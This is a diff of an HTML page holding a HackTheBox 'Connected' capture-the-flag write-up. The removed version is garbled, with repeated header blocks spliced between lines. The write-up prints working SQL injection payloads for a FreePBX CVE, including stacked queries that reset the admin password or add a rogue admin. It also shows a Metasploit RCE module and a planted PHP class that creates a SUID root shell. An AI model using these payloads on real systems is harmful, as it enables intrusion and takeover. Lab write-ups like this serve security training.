@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>HTB — Connected • HTB Writeup</title>
+    <title>Connected • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -25,11 +25,13 @@
             padding: 3rem;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
         }
-        h1 {
-            font-size: 2.5rem;
-            color: #6fffe0;
-            margin-bottom: 1.5rem;
-        }
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
         .meta-info {
             display: flex;
             flex-wrap: wrap;
@@ -41,40 +43,13 @@
         }
         .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
         .meta-info strong { color: #e0e5f0; }
-        
-        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
-        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
-        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
-        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
-        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
-        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
-        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
         .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
         .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
-        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
-        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
-        .box.info { border-left-color: #4a9eff; background: rgba(74, 158, 255, 0.03); }
         table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
         table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
         table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
         ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
         ul li { margin-bottom: 0.5rem; line-height: 1.6; }
-        
-        .ascii-art {
-            text-align: center;
-            opacity: 0.3;
-            font-size: 0.5rem;
-            line-height: 1.2;
-            color: #6fffe0;
-            overflow-x: auto;
-            margin: 1.5rem 0;
-        }
-        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
-        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
-        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
-        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
-        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
-        
         .cve-tag {
             display: inline-block;
             background: rgba(255, 0, 0, 0.15);
@@ -85,13 +60,10 @@
             font-weight: 600;
             margin-right: 0.5rem;
         }
-        .highlight {
-            background: rgba(0, 255, 200, 0.05);
-            border: 1px solid rgba(0, 255, 200, 0.1);
-            border-radius: 0.5rem;
-            padding: 0.5rem 1rem;
-            margin: 0.5rem 0;
-        }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
         .attack-chain {
             background: rgba(0, 255, 200, 0.02);
             border: 1px solid rgba(0, 255, 200, 0.1);
@@ -107,381 +79,111 @@
     </style>
 </head>
 <body>
-
 <div class="container">
-    
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-HTB — Connected</h1>
 
-<p><strong>IP:</strong> <code><TARGET></code></p>
-<p><strong>Domain:</strong> <code>connected.htb</code></p>
-<p><strong>OS:</strong> Linux (CentOS)</p>
-<p><strong>Platform:</strong> HackTheBox — Easy</p>
-<p><strong>Tech Stack:</strong> FreePBX, Asterisk, Apache/PHP, MySQL, incrond</p>
-
-<hr />
-
-<div class="attack-chain"><pre>## Attack Chain Overview
-
-```</pre></div>
-<p>Nmap → FreePBX on 80/443</p>
-<p>  → CVE-2025-57819: Unauthenticated SQLi in EPM brand parameter</p>
-<p>  → EXTRACTVALUE error-based: read admin SHA1 hash in 20-char chunks</p>
-<p>  → Stacked query UPDATE/INSERT ampusers → admin access</p>
-<p>  → Metasploit freepbx_unauth_sqli_to_rce → shell as asterisk</p>
-<p>  → incrond: ha_trigger world-writable → sysadmin_ha runs as root</p>
-<p>  → freepbx_ha module not installed, modules dir writable by asterisk</p>
-<p>  → PHP module hijacking → SUID bash → ROOT</p>
-<pre><code>
----
-
-## Table of Contents
-
-1. [Reconnaissance](#1-reconnaissance)
-2. [Vulnerability Discovery — CVE-2025-57819](#2-vulnerability-discovery--cve-2025-57819)
-3. [Credential Extraction via Error-Based SQLi](#3-credential-extraction-via-error-based-sqli)
-4. [Admin Access via SQLi Write](#4-admin-access-via-sqli-write)
-5. [Initial Access — Metasploit RCE](#5-initial-access--metasploit-rce)
-6. [Privilege Escalation — incron + PHP Module Hijacking](#6-privilege-escalation--incron--php-module-hijacking)
-7. [Root Flag](#7-root-flag)
-8. [Credentials](#8-credentials)
-9. [Key Takeaways](#9-key-takeaways)
-10. [Related Notes](#10-related-notes)
-
----
-
-## 1. Reconnaissance
-</code></pre>
-<p>nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN allports</p>
-<p>nmap -sVC -p22,80,443 $TARGET -oN service</p>
-<pre><code>
-**Output**</code></pre>
-<p>22/tcp  open  ssh    OpenSSH 7.4</p>
-<p>80/tcp  open  http   Apache/2.4.6 (CentOS) PHP/7.4.16</p>
-<p>443/tcp open  https  Apache/2.4.6 (CentOS) PHP/7.4.16</p>
-<pre><code>
-Both ports 80 and 443 expose a **FreePBX** web interface — the management frontend for the
-Asterisk PBX platform. Add the domain to `/etc/hosts`:
-</code></pre>
-<p>echo "$TARGET connected.htb" >> /etc/hosts</p>
-<pre><code>
----
-
-## 2. Vulnerability Discovery — CVE-2025-57819
-
-The FreePBX **Endpoint Manager (EPM)** module exposes an AJAX endpoint at
-`/admin/ajax.php`. The `brand` parameter is not sanitised, allowing unauthenticated
-error-based SQL injection:
-</code></pre>
-<p>curl -ik "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+database())))--+-"</p>
-<pre><code>
-**Response confirms SQLi:**</code></pre>
-<p>{"error":{"message":"XPATH syntax error: '~asterisk'"}}</p>
-<pre><code>
-The current database is `asterisk`. This is **CVE-2025-57819** — unauthenticated
-error-based injection that allows full DB read and write.
-
----
-
-## 3. Credential Extraction via Error-Based SQLi
-
-The `ampusers` table stores admin credentials as SHA1 hashes in `password_sha1`.
-`EXTRACTVALUE` truncates output at 32 chars, so a 40-char SHA1 hash must be extracted
-in two chunks using `SUBSTRING`:
-</code></pre>
-<h1>HTB — Connected</h1>
+    <h1>🚀 HTB Connected - Complete Walkthrough</h1>
 
     <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
+        <span><strong>Machine:</strong> Connected</span>
+        <span><strong>Difficulty:</strong> 🟢 Easy</span>
+        <span><strong>OS:</strong> 🐧 Linux (CentOS)</span>
+        <span><strong>Domain:</strong> connected.htb</span>
     </div>
-First 20 chars (offset 1)</h1>
-<p>curl -ik "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+SUBSTRING(password_sha1,1,20)+FROM+ampusers+WHERE+username='admin')))--+-"</p>
-<h1>HTB — Connected</h1>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
+    <h2>📋 Attack Chain Overview</h2>
+    <div class="attack-chain">
+        <pre>Nmap → FreePBX on 80/443
+  → CVE-2025-57819: Unauthenticated SQLi
+  → EXTRACTVALUE error-based: read admin SHA1 hash
+  → Stacked query UPDATE → admin access
+  → Metasploit RCE → shell as asterisk
+  → incrond: ha_trigger world-writable
+  → PHP module hijacking → SUID bash → ROOT</pre>
     </div>
-→ 05c689686a4fad5ce3ec</h1>
 
-<h1>HTB — Connected</h1>
+    <h2>🔍 Reconnaissance</h2>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
+    <h3>Nmap Scan</h3>
+    <table>
+        <tr><th>Port</th><th>Service</th><th>Details</th></tr>
+        <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.4</td></tr>
+        <tr><td>80/tcp</td><td>HTTP</td><td>Apache/2.4.6 PHP/7.4.16</td></tr>
+        <tr><td>443/tcp</td><td>HTTPS</td><td>Apache/2.4.6 PHP/7.4.16</td></tr>
+    </table>
+
+    <h2>🎯 Vulnerability — CVE-2025-57819</h2>
+
+    <h3>Unauthenticated SQL Injection</h3>
+    <pre><code>curl -ik "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+database())))--+-"</code></pre>
+
+    <div class="box success">
+        <pre><code>database: asterisk</code></pre>
     </div>
-Last 20 chars (offset 21)</h1>
-<p>curl -ik "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+SUBSTRING(password_sha1,21,20)+FROM+ampusers+WHERE+username='admin')))--+-"</p>
-<h1>HTB — Connected</h1>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
+    <h2>🔑 Credential Extraction</h2>
+
+    <h3>Extract Admin SHA1</h3>
+    <pre><code># First 20 chars: 05c689686a4fad5ce3ec
+# Last 20 chars: 76e7ae5708b1fe2da43a
+# Full: 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a</code></pre>
+
+    <h2>🔓 Admin Access</h2>
+
+    <h3>Update Password</h3>
+    <pre><code>curl -ik "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x';UPDATE+ampusers+SET+password_sha1='f865b53623b121fd34ee5426c792e5c33af8c227'+WHERE+username='admin';--+-"</code></pre>
+
+    <div class="box success">
+        <pre><code>admin:admin123</code></pre>
     </div>
-→ 76e7ae5708b1fe2da43a</h1>
 
-<h1>HTB — Connected</h1>
+    <h2>💻 Initial Access — Metasploit</h2>
+    <pre><code>msfconsole
+use exploit/unix/http/freepbx_unauth_sqli_to_rce
+set RHOSTS connected.htb
+set LHOST tun0
+set LPORT 4444
+run</code></pre>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
+    <h2>👑 Privilege Escalation</h2>
+
+    <h3>incron + PHP Module Hijacking</h3>
+    <pre><code># Create fake module
+mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc
+
+# Malicious incron.php
+cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php << 'PHP'
+<?php
+class incron {
+    public function rootTrigger() {
+        system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
+    }
+}
+PHP
+
+# Trigger
+echo "pwn" > /usr/local/asterisk/ha_trigger
+
+# SUID bash
+/tmp/rootbash -p</code></pre>
+
+    <div class="box success">
+        <pre><code>whoami
+root</code></pre>
     </div>
-Reconstructed admin SHA1:</h1>
-<h1>HTB — Connected</h1>
 
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-05c689686a4fad5ce3ec76e7ae5708b1fe2da43a</h1>
-<pre><code>
-The hash was not found in rockyou.txt. Since we have write access, it is faster to
-overwrite the hash with a known password rather than crack it.
+    <h2>📝 Credentials</h2>
+    <table>
+        <tr><th>Username</th><th>Password</th></tr>
+        <tr><td><code>admin</code></td><td><code>admin123</code></td></tr>
+        <tr><td><code>freepbxuser</code></td><td><code>mZzDpAGKTmPJ</code></td></tr>
+    </table>
 
----
-
-## 4. Admin Access via SQLi Write
-
-Generate the SHA1 of a known password and update the admin row:
-</code></pre>
-<p>echo -n "admin123" | sha1sum</p>
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-→ f865b53623b121fd34ee5426c792e5c33af8c227</h1>
-
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-Update the existing admin user via stacked query</h1>
-<p>curl -ik "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x';UPDATE+ampusers+SET+password_sha1='f865b53623b121fd34ee5426c792e5c33af8c227'+WHERE+username='admin';--+-"</p>
-<pre><code>
-Alternatively, insert a new admin user if the UPDATE fails:
-</code></pre>
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-Verify current row count</h1>
-<p>curl -ik "..&brand=x'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+COUNT(*)+FROM+ampusers)))--+-"</p>
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-→ ~2</h1>
-
-<p>curl -ik "..&brand=x';INSERT+INTO+ampusers+(username,password_sha1,extension_low,extension_high,deptname,sections)+VALUES('hacker','f865b53623b121fd34ee5426c792e5c33af8c227','0','999','','*');--+-"</p>
-
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-Confirm row count went from 2 → 3</h1>
-<pre><code>
-Log into `http://connected.htb/admin` with `admin:admin123`.
-
----
-
-## 5. Initial Access — Metasploit RCE
-
-With admin credentials the Metasploit module can authenticate and achieve RCE:
-</code></pre>
-<p>msfconsole -q</p>
-<p>use exploit/unix/http/freepbx_unauth_sqli_to_rce</p>
-<p>set RHOSTS connected.htb</p>
-<p>set LHOST tun0</p>
-<p>set LPORT 4444</p>
-<p>run</p>
-<pre><code>
-Meterpreter session as `asterisk`:
-</code></pre>
-<p>[asterisk@connected ~]$ id</p>
-<p>uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)</p>
-<p>[asterisk@connected ~]$ cat user.txt</p>
-<p><user_flag></p>
-<pre><code>
-Also of note — credentials in `/etc/freepbx.conf`:
-</code></pre>
-<p>cat /etc/freepbx.conf</p>
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-freepbxuser / mZzDpAGKTmPJ</h1>
-<pre><code>
----
-
-## 6. Privilege Escalation — incron + PHP Module Hijacking
-
-### Enumeration
-</code></pre>
-<p>find / -perm -4000 2>/dev/null     # SUID binaries (pkexec, incrontab present)</p>
-<p>getcap -r / 2>/dev/null            # suexec = cap_setuid+ep</p>
-<p>cat /etc/incron.d/*</p>
-<pre><code>
-**incron rules:**</code></pre>
-<p>/usr/local/asterisk/ha_trigger  IN_CLOSE_WRITE  /usr/sbin/sysadmin_ha</p>
-<p>/usr/local/asterisk/incron      IN_CLOSE_WRITE  /usr/bin/sysadmin_manager --local $#</p>
-<p>/var/spool/asterisk/incron      IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#</p>
-<pre><code>
-`ha_trigger` is world-writable and writing to it triggers `sysadmin_ha` **as root**:
-</code></pre>
-<p>ls -la /usr/local/asterisk/ha_trigger</p>
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
--rwxrwxrwx. 1 asterisk asterisk 0 Apr 15 2021 ha_trigger</h1>
-<pre><code>
-### Analysing sysadmin_ha
-</code></pre>
-<p>#!/usr/bin/php -q</p>
-<p><?php</p>
-<p>if (file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {</p>
-<p>    include_once("/var/www/html/admin/modules/freepbx_ha/license.php");</p>
-<p>}</p>
-
-<p>$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";</p>
-<p>if (file_exists($i)) {</p>
-<p>    require_once($i);</p>
-<p>    $incron = new incron;</p>
-<p>    $incron->rootTrigger();   // ← runs as ROOT</p>
-<p>}</p>
-<pre><code>
-The `freepbx_ha` module was not installed, but `/var/www/html/admin/modules/` is
-writable by `asterisk`. This allows **PHP module hijacking**.
-
-### Exploitation
-</code></pre>
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-1. Create the fake module structure</h1>
-<p>mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc</p>
-
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-2. Drop a malicious incron.php implementing the expected class</h1>
-<p>cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php << 'PHP'</p>
-<p><?php</p>
-<p>class incron {</p>
-<p>    public function rootTrigger() {</p>
-<p>        system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");</p>
-<p>    }</p>
-<p>}</p>
-<p>PHP</p>
-
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-3. Trigger the incrond chain</h1>
-<p>echo "pwn" > /usr/local/asterisk/ha_trigger</p>
-
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-4. Wait a moment and execute the SUID bash</h1>
-<p>sleep 3 && /tmp/rootbash -p</p>
-<pre><code></code></pre>
-<p>whoami</p>
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-root</h1>
-<pre><code>
----
-
-## 7. Root Flag
-</code></pre>
-<p>cat /root/root.txt</p>
-<h1>HTB — Connected</h1>
-
-    <div class="meta-info">
-        <span><strong>Machine:</strong> HTB</span>
-        <span><strong>Difficulty:</strong> script</span>
-        <span><strong>Target Ports:</strong> 80</span>
-        <span><strong>OS:</strong> Linux</span>
-    </div>
-<root_flag></h1>
     <div class="nav-buttons">
         <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
     </div>
-    <div class="footer">NIGHT PULSE X • 2026</div>
-</div>
 
+    <div class="footer">NIGHT PULSE X • 2026</div>
+
+</div>
 </body>
 </html>
